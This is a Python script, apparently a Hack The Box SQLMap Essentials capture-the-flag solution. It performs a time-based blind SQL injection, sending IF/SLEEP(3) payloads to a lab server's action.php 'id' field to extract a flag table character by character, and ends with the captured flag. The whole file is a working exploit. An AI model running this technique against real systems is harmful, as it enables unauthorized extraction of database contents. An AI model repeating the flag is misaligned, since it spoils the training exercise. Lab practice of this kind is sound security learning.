#find final_flag for skillsAssessmentSQLMapEssentials.md

import requests
import time

url = "http://83.136.255.142:56039/action.php"
headers = {
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7",
    "Connection": "keep-alive",
    "Content-Type": "application/json",
    "DNT": "1",
    "Host": "83.136.255.142:56039",
    "Origin": "http://83.136.255.142:56039",
    "Referer": "http://83.136.255.142:56039/shop.html",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
}

def time_based_injection(payload):
    data = {"id": payload}
    start_time = time.time()
    response = requests.post(url, headers=headers, json=data)
    elapsed_time = time.time() - start_time
    return elapsed_time > 3  

def extract_data():
    extracted_data = ""
    for position in range(1, 50):  
        for char in range(32, 127):  
            payload = (
                f"1 AND (SELECT IF(ASCII(SUBSTRING((SELECT content FROM final_flag LIMIT 1),{position},1))={char},SLEEP(3),0))"
            )
            print(f"Letmecheck: {chr(char)}", end="\r")
            if time_based_injection(payload):
                extracted_data += chr(char)
                print(f"Found: {extracted_data}")
                break
        else:

            print("\nNot Found")
            break
    return extracted_data

if __name__ == "__main__":
    print("Start...")
    result = extract_data()
    print(f"Final`: {result}")
#HTB{n07_50_h4rd_r16h7?!}
